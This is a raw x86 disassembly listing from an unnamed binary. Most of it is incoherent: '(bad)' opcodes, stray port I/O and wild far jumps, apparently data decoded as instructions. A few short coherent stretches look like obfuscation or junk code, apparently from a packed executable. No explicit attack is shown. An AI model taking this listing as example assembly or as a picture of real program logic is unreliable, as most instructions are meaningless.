  407bc1:	bound  esp,QWORD PTR [ecx-0x589da392]
  407bc7:	dec    ebx
  407bc8:	sub    BYTE PTR [ecx+0x22],cl
  407bcb:	jl     0x407c09
  407bcd:	(bad)  
  407bce:	leave  
  407bcf:	lock mov ds:0x5c053822,eax
  407bd5:	out    0x5c,al
  407bd7:	adc    BYTE PTR [ecx],bl
  407bd9:	into   
  407bda:	or     BYTE PTR [edi+0x2a41cdcb],al
  407be0:	ss push ds
  407be2:	or     eax,0x65037c1f
  407be7:	and    DWORD PTR [eax+0x71f99b74],edi
  407bed:	mov    eax,ds:0xcef09593
  407bf2:	outs   dx,DWORD PTR ds:[esi]
  407bf3:	mov    ah,BYTE PTR [eax-0x3131271e]
  407bf9:	xchg   esi,eax
  407bfa:	sbb    bl,BYTE PTR [ebx-0x2a01b4ee]
  407c00:	fcmove st,st(6)
  407c02:	mov    esi,0x9dd5dd9e
  407c07:	scas   eax,DWORD PTR es:[edi]
  407c08:	sub    al,0x5d
  407c0a:	loope  0x407c52
  407c0c:	btr    DWORD PTR [eax+eiz*8-0x6da146c8],esi
  407c14:	(bad)  
  407c15:	push   eax
  407c16:	int3   
  407c17:	mov    esp,0xf0a7bd43
  407c1c:	or     DWORD PTR [eax],edx
  407c1e:	stc    
  407c1f:	push   eax
  407c20:	dec    esi
  407c21:	ds or  eax,0x7ed471f0
  407c27:	stc    
  407c28:	aad    0x49
  407c2a:	das    
  407c2b:	or     eax,ebp
  407c2d:	inc    esi
  407c2e:	ins    BYTE PTR es:[edi],dx
  407c2f:	shr    BYTE PTR [ebp+0x37],1
  407c32:	xor    eax,0xbdc94754
  407c37:	jmp    0x5007a5f1
  407c3c:	sub    al,0x2a
  407c3e:	das    
  407c3f:	out    0xeb,al
  407c41:	mov    dh,dh
  407c43:	mov    eax,ds:0x47ae2ad9
  407c48:	test   BYTE PTR [edx+0x42c7b2f],cl
  407c4e:	in     eax,0x34
  407c50:	call   ebp
  407c52:	popa   
  407c53:	adc    DWORD PTR [edx],esi
  407c55:	sbb    edx,eax
  407c57:	cmp    ebp,ebp
  407c59:	ins    BYTE PTR es:[edi],dx
  407c5a:	lods   al,BYTE PTR ds:[esi]
  407c5b:	repnz mov dl,0x7b
  407c5e:	cmp    eax,DWORD PTR [ebx]
  407c60:	add    BYTE PTR [esi-0x7173ecf3],0xcf
  407c67:	ficomp WORD PTR [ebx-0x30]
  407c6a:	pop    ss
  407c6b:	bound  ecx,QWORD PTR [esp+ebp*1-0x26]
  407c6f:	cdq    
  407c70:	dec    esi
  407c71:	jmp    0x407c80
  407c73:	or     esi,DWORD PTR [esi+0x29]
  407c76:	sub    eax,0x6ef20b46
  407c7b:	jb     0x407c48
  407c7d:	mov    dl,0x79
  407c7f:	cli    
  407c80:	les    eax,FWORD PTR [eax]
  407c82:	rol    al,1
  407c84:	jo     0x407c73
  407c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c87:	aas    
  407c88:	dec    esi
  407c89:	xchg   BYTE PTR [edi-0x1f],dl
  407c8c:	cmp    DWORD PTR [ebx-0x28ce5f2c],edx
  407c92:	cmp    BYTE PTR [ebp-0x27],0x8
  407c96:	leave  
  407c97:	push   ebp
  407c98:	inc    edx
  407c99:	push   ss
  407c9a:	sbb    esi,DWORD PTR ds:[ebp-0xf]
  407c9e:	mov    al,ds:0x7ab5a035
  407ca3:	adc    DWORD PTR [esi],ebx
  407ca5:	cwde   
  407ca6:	pop    es
  407ca7:	(bad)
  407caa:	(bad)  
  407cac:	cli    
  407cad:	cld    
  407cae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407caf:	cmp    al,0x45
  407cb1:	sub    DWORD PTR [eax-0x4e],edx
  407cb4:	call   0x45f13f54
  407cb9:	dec    ecx
  407cba:	mov    cl,0x56
  407cbc:	in     eax,0x59
  407cbe:	xchg   DWORD PTR [edi-0x4f],edx
  407cc1:	imul   ecx,DWORD PTR [eax+0x2d665e8a],0x16
  407cc8:	cmp    esp,edi
  407cca:	dec    edx
  407ccb:	in     eax,dx
  407ccc:	sub    BYTE PTR [ebp-0x6de94979],dh
  407cd2:	shl    DWORD PTR [edx+edx*1-0x63],1
  407cd6:	jle    0x407cb9
  407cd8:	int3   
  407cd9:	pop    ebp
  407cda:	pop    edx
  407cdb:	(bad)  [ebx+0x74]
  407cde:	mov    eax,ds:0xc20ef359
  407ce3:	add    dh,ah
  407ce5:	stos   BYTE PTR es:[edi],al
  407ce6:	hlt    
  407ce7:	dec    ebx
  407ce8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ce9:	es sub eax,0xa01ac4fb
  407cef:	sub    bl,cl
  407cf1:	shl    BYTE PTR [ebx+0x29eed831],cl
  407cf7:	mov    edx,0xba7ea4e8
  407cfc:	arpl   WORD PTR [ebp+0x21],dx
  407cff:	push   ds
  407d00:	cmp    al,0x80
  407d02:	adc    edi,DWORD PTR [esi-0x57]
  407d05:	mov    ebp,0x85abd9b1
  407d0a:	test   bh,dh
  407d0c:	(bad)
  407d0f:	mov    BYTE PTR [ebx+0x5854f935],bl
  407d15:	rol    DWORD PTR [ecx-0x1649337d],1
  407d1b:	sub    DWORD PTR [esi],0x4
  407d1e:	frstor [edi]
  407d20:	or     BYTE PTR [ebx],cl
  407d22:	hlt    
  407d23:	xchg   ecx,eax
  407d25:	cmp    edx,DWORD PTR [eax-0x6843283e]
  407d2b:	rcr    BYTE PTR [ecx],cl
  407d2d:	inc    edx
  407d2e:	leave  
  407d2f:	ja     0x407d07
  407d31:	add    eax,DWORD PTR [edi-0xad95c23]
  407d37:	fcom   DWORD PTR [ecx]
  407d39:	xor    edx,ecx
  407d3b:	mov    edi,edi
  407d3d:	add    bl,BYTE PTR ds:0x1e924c4d
  407d43:	xchg   BYTE PTR [eax-0x6dad3666],al
  407d49:	pop    es
  407d4a:	or     al,0x36
  407d4c:	cmp    al,0x26
  407d4e:	int3   
  407d4f:	retf   0x540e
  407d52:	faddp  st(5),st
  407d54:	mov    bh,0x1c
  407d56:	mov    bh,0xe9
  407d58:	sbb    ah,BYTE PTR [edi-0x75]
  407d5b:	sbb    BYTE PTR [esi-0x63],dh
  407d5e:	sbb    BYTE PTR [edx],dh
  407d60:	inc    esp
  407d61:	mov    al,0x10
  407d63:	inc    edi
  407d64:	jp     0x407cf9
  407d66:	cmp    BYTE PTR [esi-0x3d],ah
  407d69:	lock pop ss
  407d6b:	cld    
  407d6c:	jo     0x407d13
  407d6e:	retf   
  407d6f:	mov    esp,0xd11e88fa
  407d74:	or     BYTE PTR [ebx+0x57],0x43
  407d78:	cmp    eax,0xbbd8ef5f
  407d7d:	mov    dh,0xac
  407d7f:	mov    ?,WORD PTR [edx]
  407d81:	(bad)  
  407d82:	push   ss
  407d83:	cmp    dh,cl
  407d85:	push   cs
  407d86:	push   esi
  407d87:	add    DWORD PTR [ebp+0x2e1e6942],ebx
  407d8d:	call   0xb671:0x16f19d75
  407d94:	cwde   
  407d95:	js     0x407da1
  407d97:	sbb    eax,DWORD PTR [ebx]
  407d99:	ins    DWORD PTR es:[edi],dx
  407d9a:	addr16 jmp 0x435f90d3
  407da0:	out    dx,eax
  407da1:	ror    DWORD PTR [eax-0x51714e53],cl
  407da7:	jmp    0x407d29
  407da9:	inc    edi
  407daa:	adc    al,0x11
  407dac:	and    eax,0x190c74f4
  407db1:	jge    0x407e03
  407db3:	not    BYTE PTR [eax+0x4c]
  407db6:	ins    DWORD PTR es:[edi],dx
  407db7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407db8:	ja     0x407d93
  407dba:	pop    edx
  407dbb:	xor    eax,0x250b5c61
  407dc0:	scas   al,BYTE PTR es:[edi]
  407dc1:	cmc    
  407dc2:	test   al,0x25
  407dc4:	sar    esi,1
  407dc6:	jno    0x407e32
  407dc8:	mov    ds:0xe2cefa04,al
  407dcd:	cmp    cl,BYTE PTR [esi+0x6b486e67]
  407dd3:	add    eax,0x838b80c7
  407dd8:	in     al,dx
  407dd9:	and    DWORD PTR [edi+0x62],ecx
  407ddc:	sub    al,0x55
  407dde:	pop    ebx
  407ddf:	bswap  ebp
  407de1:	pop    edx
  407de2:	xor    al,dl
  407de4:	mov    DWORD PTR [esi+0x42ce18ce],esi
  407dea:	pop    es
  407deb:	fidivr WORD PTR [ebx]
  407ded:	ins    DWORD PTR es:[edi],dx
  407dee:	(bad)  
  407def:	mov    eax,0xcd954033
  407df4:	and    eax,0x48d4be9f
  407df9:	jns    0x407e6d
  407dfb:	pop    es
  407dfc:	mov    al,ds:0x175ad77b
  407e01:	outs   dx,BYTE PTR ds:[esi]
  407e02:	push   0xffffffbe
  407e04:	dec    edi
  407e05:	mov    WORD PTR [ecx-0x48],es
  407e08:	xchg   edi,eax
  407e09:	cld    
  407e0a:	out    0x39,al
  407e0c:	in     eax,0xd
  407e0e:	out    dx,al
  407e0f:	das    
  407e10:	cmp    bh,BYTE PTR [ecx-0x20ea857]
  407e16:	sbb    BYTE PTR [ebx],cl
  407e18:	and    ch,ah
  407e1a:	sbb    esp,DWORD PTR [esi+edx*1]
  407e1d:	xchg   edi,eax
  407e1e:	and    al,BYTE PTR [eax]
  407e20:	stos   DWORD PTR es:[edi],eax
  407e21:	or     dh,BYTE PTR [edi-0xd9d896a]
  407e27:	add    ebx,DWORD PTR [ecx]
  407e29:	fisub  WORD PTR [esi-0x5fc6a8b7]
  407e2f:	jp     0x407e5f
  407e31:	push   ebp
  407e32:	adc    al,0xa8
  407e34:	out    0xa2,eax
  407e36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e37:	mov    esi,0x15d8e648
  407e3c:	ret    0x1502
  407e3f:	sbb    eax,0x4ae2ce67
  407e44:	mov    ebx,0x84555c9c
  407e49:	sub    eax,esi
  407e4b:	popf   
  407e4c:	cmp    ecx,ebx
  407e4e:	sbb    eax,0x30873410
  407e53:	push   cs
  407e54:	popf   
  407e55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e56:	in     eax,dx
  407e57:	dec    ecx
  407e58:	mov    dl,dh
  407e5a:	xor    eax,DWORD PTR [esp+esi*8]
  407e5d:	jmp    0x906c:0xbf8eaff3
  407e64:	push   esi
  407e65:	xor    dl,dh
  407e67:	inc    esi
  407e68:	cmp    ebp,DWORD PTR [eax-0x1]
  407e6b:	aaa    
  407e6c:	daa    
  407e6d:	jno    0x407e41
  407e6f:	loope  0x407e9c
  407e71:	jp     0x407e0e
  407e73:	das    
  407e74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e75:	loope  0x407e44
  407e77:	fcom   QWORD PTR [esi+0x663f453a]
  407e7d:	or     eax,0x21921fb8
  407e82:	loope  0x407f00
  407e84:	push   ebp
  407e85:	sbb    edx,ebp
  407e87:	dec    esi
  407e88:	ins    BYTE PTR es:[edi],dx
  407e89:	push   cs
  407e8a:	cld    
  407e8b:	xchg   DWORD PTR [edi-0x2],ecx
  407e8e:	out    0x40,eax
  407e90:	mov    esp,0xa38fa516
  407e95:	or     eax,0x403d49e8
  407e9a:	sbb    eax,0x3129674a
  407e9f:	repz fadd DWORD PTR [ebx+0x1c3239f6]
  407ea6:	jo     0x407ee1
  407ea8:	add    ebx,ebx
  407eaa:	jl     0x407e53
  407eac:	ds pop edi
  407eae:	xacquire xchg BYTE PTR [ebx-0x53ca01ac],bl
  407eb5:	fs xchg esp,eax
  407eb7:	and    DWORD PTR [esi-0x48],edi
  407eba:	retf   0xae0a
  407ebd:	shl    DWORD PTR [edi-0x76],0xd6
  407ec1:	pop    esi
  407ec2:	idiv   DWORD PTR ds:0xdb578170
  407ec8:	mov    al,ds:0x2e91ef19
  407ecd:	mul    edi
  407ecf:	inc    edx
  407ed0:	cmp    al,0x7a
  407ed2:	push   ecx
  407ed3:	cwde   
  407ed4:	add    DWORD PTR [edi],esi
  407ed6:	push   0xe4c8e3d4
  407edb:	ins    BYTE PTR es:[edi],dx
  407edc:	fadd   DWORD PTR [eax+esi*1]
  407edf:	adc    bl,BYTE PTR [eax-0x47038a7f]
  407ee5:	sahf   
  407ee6:	adc    al,0xe
  407ee8:	mov    ax,WORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43376f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	test   eax,0x2a8589cc
  407f22:	(bad)  
  407f23:	jle    0x407fa3
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	inc    ebx
  407f2a:	jle    0x407f2c
  407f2c:	mov    bh,BYTE PTR [edx]
  407f2e:	cmc    
  407f2f:	fst    st(7)
  407f31:	psrlw  mm6,QWORD PTR [ecx-0x13c15345]
  407f38:	mov    BYTE PTR [ecx+0x7f9a7c50],dl
  407f3e:	dec    ebx
  407f3f:	xchg   edi,eax
  407f40:	sub    cl,BYTE PTR [ebx-0x27]
  407f43:	mov    ds:0x8c1fc947,eax
  407f48:	retf   
  407f49:	aaa    
  407f4a:	xlat   BYTE PTR ds:[ebx]
  407f4b:	sti    
  407f4c:	add    esp,eax
  407f4e:	stos   DWORD PTR es:[edi],eax
  407f4f:	pop    esi
  407f50:	clc    
  407f51:	mov    ch,0x26
  407f53:	mov    ds:0x85515abc,al
  407f58:	mov    ecx,0x83a4ad13
  407f5d:	retf   
  407f5e:	mov    dh,0x90
  407f60:	stos   BYTE PTR es:[edi],al
  407f61:	ins    BYTE PTR es:[edi],dx
  407f62:	stos   BYTE PTR es:[edi],al
  407f63:	jmp    esp
  407f65:	and    esp,DWORD PTR [ecx-0x23032dd5]
  407f6b:	aad    0x70
  407f6d:	push   cs
  407f6e:	ins    DWORD PTR es:[edi],dx
  407f6f:	cs mov al,al
  407f72:	push   0x7da21070
  407f77:	sbb    DWORD PTR [ebp-0x7934108d],edx
  407f7d:	outs   dx,BYTE PTR ds:[esi]
  407f7e:	ds pop edx
  407f80:	shl    BYTE PTR [ebp-0xe790934],1
  407f86:	cmp    al,0x1d
  407f88:	out    dx,al
  407f89:	sub    BYTE PTR [ebp+0x77d3f50e],al
  407f8f:	jo     0x407f1b
  407f91:	xor    edx,esp
  407f93:	and    eax,DWORD PTR [eax]
  407f95:	je     0x407fc6
  407f97:	xlat   BYTE PTR ds:[ebx]
  407f98:	mov    al,0x46
  407f9a:	(bad)  
  407f9b:	imul   ebx,DWORD PTR [edi+0x23b1c9af],0x5bf170f8
  407fa5:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fa7:	enter  0x5eaf,0xd4
  407fab:	push   0x1f
  407fad:	imul   edi,DWORD PTR [ecx+0x4f7e05b8],0x13
  407fb4:	sbb    BYTE PTR [esi],cl
  407fb6:	cmp    al,0x3c
  407fb8:	jnp    0x407f68
  407fba:	mov    WORD PTR [ebp+eax*1+0x171614af],fs
  407fc1:	inc    ebp
  407fc2:	fwait
  407fc3:	outs   dx,DWORD PTR ds:[esi]
  407fc4:	jl     0x408014
  407fc6:	dec    eax
  407fc7:	pop    eax
  407fc8:	or     BYTE PTR [ebx+esi*1],bl
  407fcb:	cwde   
  407fcc:	(bad)  
  407fcd:	jl     0x407fbe
  407fcf:	int    0x86
  407fd1:	jmp    0x190205b1
  407fd6:	xchg   edx,eax
  407fd7:	fcomp  QWORD PTR [ebx-0x3dacc265]
  407fdd:	scas   eax,DWORD PTR es:[edi]
  407fde:	test   al,0x80
  407fe0:	mov    bl,0x1b
  407fe2:	loopne 0x407f6a
  407fe4:	jnp    0x407ff4
  407fe6:	inc    edi
  407fe7:	pusha  
  407fe8:	data16 mov ds:0x2e1ad0d6,al
  407fee:	sbb    DWORD PTR [ebx+0x7affc4e4],edi
  407ff4:	hlt    
  407ff5:	cmp    edx,DWORD PTR [esi-0x1de61e34]
  407ffb:	scas   al,BYTE PTR es:[edi]
  407ffc:	push   0xffffffc4
  407ffe:	lock ror DWORD PTR [edx-0x6a380120],cl
  408005:	jne    0x407f9e
  408007:	cmp    DWORD PTR [ecx-0x12],ebp
  40800a:	sub    al,0x53
  40800c:	outs   dx,DWORD PTR ds:[esi]
  40800d:	in     eax,0x4e
  40800f:	outs   dx,DWORD PTR ds:[esi]
  408010:	fnstenv [ebp+0x2836089a]
  408016:	push   ds
  408017:	jmp    0x2daf:0xf9832013
  40801e:	mov    esi,0xb6271011
  408023:	sbb    eax,0x95d31071
  408028:	test   al,0x13
  40802a:	mov    ch,0x92
  40802c:	mov    DWORD PTR [esi],0xee43a7da
  408032:	and    eax,0x45001e7c
  408037:	adc    eax,0xed8b8f4e
  40803c:	cdq    
  40803d:	sbb    al,0xb7
  40803f:	(bad)  
  408040:	or     edx,DWORD PTR [ecx+eax*2-0x3bc890d3]
  408047:	mov    dl,0x85
  408049:	adc    DWORD PTR [ebx+0x3f],esp
  40804c:	add    al,0x4d
  40804e:	iret   
  40804f:	popa   
  408050:	adc    BYTE PTR [eax+eiz*8+0x22],0x55
  408055:	cmp    dh,BYTE PTR [ecx]
  408057:	scas   eax,DWORD PTR es:[edi]
  408058:	inc    edx
  408059:	fnstcw WORD PTR [esp]
  40805c:	dec    ecx
  40805d:	pop    edi
  40805e:	inc    esp
  40805f:	aad    0xc8
  408061:	aaa    
  408062:	iret   
  408063:	dec    esi
  408064:	sbb    al,0x21
  408066:	aam    0xc1
  408068:	aam    0x68
  40806a:	and    al,0xc8
  40806c:	inc    edi
  40806d:	pop    ebx
  40806e:	and    al,0xf4
  408070:	and    bh,BYTE PTR [esi]
  408072:	fs dec edi
  408074:	outs   dx,DWORD PTR ds:[esi]
  408075:	or     ebp,0x352c9d95
  40807b:	cmp    al,0xe8
  40807d:	mov    ebp,0x86aee0f
  408082:	xchg   edi,eax
  408083:	popa   
  408084:	lock js 0x40804c
  408087:	jp     0x40802e
  408089:	lods   eax,DWORD PTR ds:[esi]
  40808a:	xor    cl,al
  40808c:	in     al,dx
  40808d:	and    eax,0x8fafbd04
  408092:	lahf   
  408093:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40809a:	inc    ecx
  40809b:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4080a2:	mov    eax,0x9577
  4080a7:	mov    ecx,DWORD PTR ds:0x433727
  4080ad:	xor    DWORD PTR ds:0x433833,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433837
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4337fb
  4080d7:	add    ecx,DWORD PTR ds:0x43371b
  4080dd:	mov    DWORD PTR ds:0x4337fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433767,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433783,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43371f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4337b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4337b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4337b3,eax
  408121:	cmp    DWORD PTR ds:0x4337b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4337b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4337b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4337b3
  408158:	inc    eax
  408159:	mov    ds:0x4337b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43376b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0x8b95208b
  40818c:	aam    0x90
  40818e:	xlat   BYTE PTR ds:[ebx]
  40818f:	jle    0x40820f
  408191:	in     al,0x7f
  408193:	jle    0x408213
  408195:	loop   0x4081e4
  408197:	inc    BYTE PTR [edx+0x559918fe]
  40819d:	dec    eax
  40819e:	(bad)  
  40819f:	mov    ds:0x38587529,al
  4081a4:	stc    
  4081a5:	sar    DWORD PTR [ecx+edi*8+0xc],0x9e
  4081aa:	nop
  4081ab:	xchg   ebp,eax
  4081ac:	adc    dh,bh
  4081ae:	push   eax
  4081af:	nop
  4081b0:	cli    
  4081b1:	outs   dx,DWORD PTR ds:[esi]
  4081b2:	outs   dx,BYTE PTR ds:[esi]
  4081b3:	and    bh,BYTE PTR [edi]
  4081b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081b6:	lods   al,BYTE PTR ds:[esi]
  4081b7:	in     eax,dx
  4081b8:	push   esp
  4081b9:	or     ebx,ebp
  4081bb:	repz hlt 
  4081bd:	xchg   DWORD PTR ds:0x7143448c,ebx
  4081c3:	pop    ecx
  4081c4:	ins    BYTE PTR es:[edi],dx
  4081c5:	adc    ecx,DWORD PTR [eax+0x2d0f8fdb]
  4081cb:	inc    ecx
  4081cc:	pushf  
  4081cd:	dec    edx
  4081ce:	out    dx,al
  4081cf:	(bad)  
  4081d1:	add    ebp,0x6c
  4081d4:	add    al,0x33
  4081d6:	xlat   BYTE PTR ds:[ebx]
  4081d7:	add    BYTE PTR [ebp-0x25f4931c],al
  4081dd:	push   esp
  4081de:	xchg   ebp,eax
  4081df:	jae    0x408165
  4081e1:	add    al,0x1a
  4081e3:	xchg   esp,eax
  4081e4:	mov    ebx,0x80df9b96
  4081e9:	xchg   edi,eax
  4081ea:	adc    DWORD PTR [edx],esi
  4081ec:	adc    bh,BYTE PTR [eax-0xb]
  4081ef:	xchg   esp,eax
  4081f0:	out    0xd7,al
  4081f2:	push   esp
  4081f3:	neg    BYTE PTR [ecx+0x2baa4f39]
  4081f9:	ret    
  4081fa:	push   ss
  4081fb:	push   ebx
  4081fc:	inc    esi
  4081fd:	lea    edi,[ecx+0x7d983896]
  408203:	or     BYTE PTR [esi+ebx*2],bh
  408206:	sbb    edi,DWORD PTR [ebx+0x69]
  408209:	add    ch,dl
  40820b:	dec    ebx
  40820c:	clc    
  40820d:	cdq    
  40820e:	jecxz  0x4081b4
  408210:	push   0xffffffda
  408212:	ins    BYTE PTR es:[edi],dx
  408213:	das    
  408214:	cs pop ss
  408216:	mov    ecx,0x6499039b
  40821b:	fwait
  40821c:	lods   eax,DWORD PTR ds:[esi]
  40821d:	xor    BYTE PTR [ebx+0xf],dl
  408220:	cmp    DWORD PTR [ebx+0x0],0xffffffc5
  408224:	pop    edx
  408225:	inc    edx
  408226:	push   esp
  408227:	jecxz  0x40829c
  408229:	test   BYTE PTR [ebx-0x67b8384e],bh
  40822f:	rol    DWORD PTR [ebp+0x11ef693d],1
  408235:	dec    ebx
  408236:	mov    esi,0x95e3e646
  40823b:	jecxz  0x4081d5
  40823d:	pop    ecx
  40823e:	pop    esp
  40823f:	push   es
  408240:	lahf   
  408241:	cli    
  408242:	loop   0x40821a
  408244:	mov    esi,DWORD PTR [ecx]
  408246:	push   ebx
  408247:	cmp    eax,0xe86d2a5f
  40824c:	clc    
  40824d:	ret    
  40824e:	pop    ebx
  40824f:	mov    bh,0xee
  408251:	test   DWORD PTR [bx+0x17],eax
  408255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408256:	fxch   st(3)
  408258:	sub    dh,bh
  40825a:	fld    st(1)
  40825c:	cmp    DWORD PTR [eax+0x40],0x57
  408260:	add    BYTE PTR [ebp-0x312d3544],0xe9
  408267:	pusha  
  408268:	dec    BYTE PTR [esi+0x1ebcbb86]
  40826e:	cld    
  40826f:	cmp    DWORD PTR [edi+0x6c],ecx
  408272:	and    DWORD PTR [esi-0x111464e3],0xe4931cb1
  40827c:	mov    eax,fs:0x3b797b04
  408282:	inc    eax
  408283:	aam    0xec
  408285:	iret   
  408286:	fadd   DWORD PTR [esi]
  408288:	int3   
  408289:	push   edi
  40828a:	popa   
  40828b:	xchg   esp,ecx
  40828d:	dec    ebx
  40828e:	inc    ebp
  40828f:	mov    eax,0xb2c902e5
  408294:	mov    dh,0xee
  408296:	mov    dh,0x7b
  408298:	shr    edx,1
  40829a:	test   edi,esi
  40829c:	stos   BYTE PTR es:[edi],al
  40829d:	xor    DWORD PTR [esi-0x6c858101],0xedff0451
  4082a7:	in     eax,0xe3
  4082a9:	mov    edi,0xbd6388dd
  4082ae:	out    dx,al
  4082af:	fstp   QWORD PTR [ebp+0x9]
  4082b2:	js     0x40826d
  4082b4:	push   esp
  4082b5:	cli    
  4082b6:	inc    ebp
  4082b7:	ja     0x4082f9
  4082b9:	sub    DWORD PTR [edx+0x14],esi
  4082bc:	inc    edi
  4082bd:	pop    ds
  4082be:	stos   DWORD PTR es:[di],eax
  4082c0:	mov    ah,BYTE PTR [esi-0x6aa35fd8]
  4082c6:	(bad)  
  4082c7:	loope  0x4082c5
  4082c9:	fdivr  st(7),st
  4082cb:	cmp    ah,dh
  4082cd:	xor    BYTE PTR [edi],ah
  4082cf:	cmp    ah,BYTE PTR [ebp+ecx*8+0x19]
  4082d3:	and    edx,esi
  4082d5:	out    dx,eax
  4082d6:	inc    edx
  4082d7:	jbe    0x40834b
  4082d9:	jmp    0x5fb8e2f9
  4082de:	jge    0x408290
  4082e0:	scas   eax,DWORD PTR es:[edi]
  4082e1:	cmc    
  4082e2:	fld    st(4)
  4082e4:	outs   dx,BYTE PTR ds:[esi]
  4082e5:	outs   dx,DWORD PTR ds:[esi]
  4082e6:	sbb    BYTE PTR [ecx-0x3e674169],cl
  4082ec:	mov    dl,BYTE PTR [ecx-0x32]
  4082ef:	cmp    edi,DWORD PTR [eax]
  4082f1:	pop    edi
  4082f2:	mov    DWORD PTR [edi+0x20f1e4a1],esi
  4082f8:	xchg   esi,eax
  4082f9:	jo     0x40830b
  4082fb:	lods   eax,DWORD PTR ds:[esi]
  4082fc:	mov    ebx,0xc13308ae
  408301:	and    DWORD PTR ds:0x43377f,0x1370
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433723,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x4337af,0x433843
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4337bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43377b,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43371b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4337ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x433773,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0xe402d5e0
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x4083ed
  40838a:	inc    eax
  40838b:	cmc    
  40838c:	ss mov ebp,0x6e1fdf27
  408392:	xchg   BYTE PTR [edx+0x19],dh
  408395:	pop    ds
  408396:	add    dh,bl
  408398:	inc    ebx
  408399:	jecxz  0x40836c
  40839b:	rol    DWORD PTR [ecx],1
  40839d:	dec    edx
  40839e:	cwde   
  40839f:	shl    BYTE PTR [ebx],cl
  4083a1:	xlat   BYTE PTR ds:[ebx]
  4083a2:	cmp    DWORD PTR [eax-0x27],0xffffffbe
  4083a6:	cmp    BYTE PTR [ebx],ch
  4083a8:	mov    ah,0x83
  4083aa:	fnstsw WORD PTR [esi]
  4083ac:	into   
  4083ad:	(bad)  
  4083ae:	iret   
  4083af:	and    eax,0x559736ad
  4083b4:	leave  
  4083b5:	aas    
  4083b6:	sbb    al,0x8d
  4083b8:	stc    
  4083b9:	and    esi,DWORD PTR [edx-0x1790258]
  4083bf:	arpl   WORD PTR [edx-0x1b],ax
  4083c2:	stc    
  4083c3:	outs   dx,DWORD PTR ds:[esi]
  4083c4:	sbb    dl,BYTE PTR [ecx+edi*2]
  4083c7:	jmp    0x483d:0xb97411b5
  4083ce:	mov    ah,0x45
  4083d0:	adc    dl,BYTE PTR [eax]
  4083d2:	jmp    0xc59e49b
  4083d7:	mov    DWORD PTR ds:[esi+0xc],edi
  4083db:	jle    0x408407
  4083dd:	cmp    eax,0x74aca827
  4083e2:	mov    ds:0x4055581d,eax
